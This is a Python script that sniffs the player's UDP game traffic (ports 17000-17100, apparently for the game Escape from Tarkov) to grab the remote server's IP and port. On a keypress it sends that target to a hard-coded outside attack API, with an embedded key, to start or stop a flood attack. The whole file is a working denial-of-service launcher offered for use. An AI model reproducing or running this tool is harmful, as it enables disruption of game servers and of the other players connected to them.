from scapy.all import *
from pynput.keyboard import Key, Listener
from pprint import pprint
import multiprocessing
import requests
import winsound
import json
import time

apiUrl = "http://141.95.55.0/gg/tarkov.php?key=f15be64fbd498ecb5d6fed696f36b086"
currentIP = "0.0.0.0"
currentPort = 0
isAttacking = False
attackKey = "y"
checkKey = "u"
currentAttackingIP = "0.0.0.0"
currentAttackingPort = 0

def setCurrentIP(data):
    global currentIP
    global currentPort
    local = data[IP].dst[0:7]
    ip = data[IP].dst
    port = data[UDP].dport
    if local != "192.168":
        if ip != currentIP:
            currentIP = ip
            currentPort = port
            print("New IP address detected: {0}:{1}".format(ip, port))

def handleAttack(ip, port, action):
    global apiUrl
    global currentAttackingIP
    global currentAttackingPort
    if action == "start":
        currentAttackingIP = ip
        currentAttackingPort = port
        method = "TARKOV"
    else:
        method = "STOP"

    handle = requests.get("{0}&host={1}&port={2}&method={3}".format(apiUrl, currentAttackingIP, currentAttackingPort, method))
    handle = json.loads(handle.text)
    if handle["success"] == True:
        print(handle["message"])
        return True
    else:
        print(handle["message"])
        return False

def on_press(key):
    global isAttacking
    global currentIP
    global currentPort
    global currentAttackingIP
    global currentAttackingPort
    if hasattr(key, "char"):
        if key.char == attackKey:
            if isAttacking:
                response = handleAttack(currentAttackingIP, currentAttackingPort, "stop")
                if response == True:
                    isAttacking = False
                    winsound.Beep(500, 500)
            else:
                response = handleAttack(currentIP, currentPort, "start")
                if response == True:
                    isAttacking = True
                    winsound.Beep(500, 500)
        '''elif key.char == checkKey:
            startSniffing()'''

def on_release(key):
    global currentIP
    global currentPort
    global currentAttackingIP
    global currentAttackingPort
    if key == Key.esc:
        handleAttack(currentIP, currentPort, "stop")
        handleAttack(currentAttackingIP, currentAttackingPort, "stop")
        print("Attack force stopped, application closing.")
        return False

#sniff(filter = "udp and portrange 17000-17100", stop_filter = setCurrentIP)

def startSniffing():
    #sniff(filter = "udp and portrange 50000-50030", stop_filter = setCurrentIP, count = 3)
    sniff(filter = "udp and portrange 17000-17100", stop_filter = setCurrentIP, count = 3)

def startListening():
    with Listener(on_press = on_press, on_release = on_release) as listener:listener.join()

startSniffing()
startListening()